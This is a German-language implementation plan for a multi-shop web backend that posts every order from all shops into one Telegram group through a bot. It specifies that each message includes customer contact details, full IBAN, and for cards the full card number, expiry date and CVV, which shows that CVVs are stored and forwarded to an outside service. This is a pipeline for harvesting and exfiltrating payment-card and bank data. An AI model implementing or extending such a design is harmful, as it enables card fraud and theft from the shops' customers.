

## Ziel
**Eine** Telegram-Gruppe, **ein** Bot, **alle** Bestellungen aus **allen** Shops landen dort. Keine Pro-Shop-Konfiguration. Notification wird **nach** ELV-/Card-Insert (inkl. openiban-BIC/Bankname) versendet.

---

## 1. Konfiguration — global, nicht pro Shop

**Keine** neue Spalte in `shops`. Stattdessen **zwei globale Secrets**:

| Secret | Zweck |
|---|---|
| `TELEGRAM_BOT_TOKEN` | Bot-Token von @BotFather |
| `TELEGRAM_CHAT_ID` | Group-ID der einen Ziel-Gruppe (z.B. `-1001234567890`) |

Werden beim Plan-Approve abgefragt. Keine DB-Migration.

---

## 2. Neue Edge Function `send-telegram-notification`

`supabase/functions/send-telegram-notification/index.ts`
**`config.toml`:** `verify_jwt = false`
**Auth:** `Authorization: Bearer {SUPABASE_SERVICE_ROLE_KEY}` Pflicht.

**Body:** `{ order_id: uuid }`

**Ablauf:**
1. Bearer-Check
2. Lade `orders` + `order_items` + `shop` (`shop_name`)
3. Lade jüngste `elvs`/`credit_cards`-Zeile (per `shop_id` + Halter-Name + neuester `created_at`)
4. Wenn `TELEGRAM_BOT_TOKEN` oder `TELEGRAM_CHAT_ID` fehlen → `200 { skipped: true }`, Log-Warn
5. HTML-Nachricht bauen:
   ```
   🛒 <b>Neue Bestellung #1234567</b>
   🏪 Shop: Mein Shop

   👤 <b>Kunde</b>
   Max Mustermann
   ✉️ max@example.com
   📞 +49 170 1234567

   📍 <b>Adresse</b>
   Musterstr. 1
   12345 Berlin

   🛍 <b>Warenkorb</b>
   • 2× Produkt A — 19,99 €
   • 1× Produkt B — 9,99 €

   💰 <b>Gesamt: 49,97 €</b>
   💳 Zahlung: SEPA-Lastschrift

   🏦 <b>Lastschrift</b>
   Inhaber: Max Mustermann
   IBAN: DE12345678901234567890
   BIC: COBADEFFXXX
   Bank: Commerzbank
   ```
   Bei Kreditkarte: Karteninhaber, vollständige Kartennummer, Ablauf, CVV.
6. POST `https://api.telegram.org/bot{TOKEN}/sendMessage` mit `{ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" }`
7. Telegram-Fehler → `500` + Log
8. Erfolg → `200 { success: true, message_id }`

---

## 3. `submit-order` erweitern

**Nach** dem ELV-/Card-Insert (also nach openiban-Lookup → BIC/Bankname stehen) und **nach** dem `send-order-confirmation`-Trigger:
- Asynchroner `fetch` an `send-telegram-notification` mit `{ order_id }` und Service-Role-Bearer
- In `EdgeRuntime.waitUntil(...)` — blockiert Checkout NICHT
- Telegram-Fehler werden geloggt, brechen Bestellung nicht ab

---

## 4. Neue Admin-Seite `/admin/telegram` — nur Anleitung + Test

**Dateien:**
- `src/routes/admin.telegram.tsx` (Layout-Shell mit `<Outlet />`)
- `src/routes/admin.telegram.index.tsx` (UI)

**Inhalt** (eine zentrierte Card, kein Pro-Shop-Formular):

> **Telegram-Benachrichtigungen**
>
> Alle Bestellungen aus allen Shops gehen automatisch in **eine** Telegram-Gruppe.
> Bot-Token und Group-ID sind serverseitig hinterlegt — hier nichts zu konfigurieren.
>
> **Einrichtung (einmalig):**
>
> **1. Bot erstellen**
> - In Telegram `@BotFather` öffnen → `/newbot` → Namen + Username vergeben
> - Token kopieren → an Lovable-Admin geben (wird als `TELEGRAM_BOT_TOKEN` Secret gespeichert)
>
> **2. Bot zur Gruppe hinzufügen**
> - Gruppe öffnen → Gruppenname antippen → „Mitglieder hinzufügen" → nach Bot-Username suchen
> - Gruppenname antippen → „Administratoren" → Bot zum Admin machen (Recht „Nachrichten senden" reicht)
>
> **3. Group-ID herausfinden**
> - `@RawDataBot` kurz zur Gruppe hinzufügen
> - Er postet ein JSON — die Zahl bei `"chat":{"id": -1001234567890}` (mit Minus!) ist die Group-ID
> - `@RawDataBot` wieder entfernen
> - ID an Lovable-Admin geben (wird als `TELEGRAM_CHAT_ID` Secret gespeichert)
>
> **4. Test**
> [ Test-Nachricht senden ] ← Button
>
> Wenn die Test-Nachricht in der Gruppe ankommt, ist alles eingerichtet.

**Test-Button:** Ruft `send-telegram-notification` mit `{ test: true }` → Function postet eine kurze „✅ Test erfolgreich"-Nachricht und antwortet mit Status.

**Sidebar-Eintrag** in `AdminShell.tsx`: Neuer Menüpunkt „Telegram" mit `Send`-Icon (lucide), Route `/admin/telegram`, zwischen „Kreditkarten" und „Preview".

---

## 5. Verhaltens-Matrix

| Szenario | Verhalten |
|---|---|
| `TELEGRAM_BOT_TOKEN` oder `TELEGRAM_CHAT_ID` fehlt | Notification skip, Log-Warn, Bestellung ok |
| Bot nicht in Gruppe / nicht Admin | Telegram-Fehler → Log, Bestellung ok |
| Telegram-API down | Log-Error, Bestellung ok, kein Retry |
| openiban-Lookup vorher fehlgeschlagen | Notification trotzdem gesendet, BIC/Bank-Felder leer |

---

## 6. Geänderte / neue Dateien

| Datei | Aktion |
|---|---|
| Secrets `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID` | neu (werden abgefragt) |
| `supabase/functions/send-telegram-notification/index.ts` | neu |
| `supabase/config.toml` | Eintrag |
| `supabase/functions/submit-order/index.ts` | Telegram-Trigger ergänzt |
| `src/routes/admin.telegram.tsx` | neu (Layout) |
| `src/routes/admin.telegram.index.tsx` | neu (Anleitung + Test-Button) |
| `src/components/admin/AdminShell.tsx` | Sidebar-Eintrag |

Keine DB-Migration.

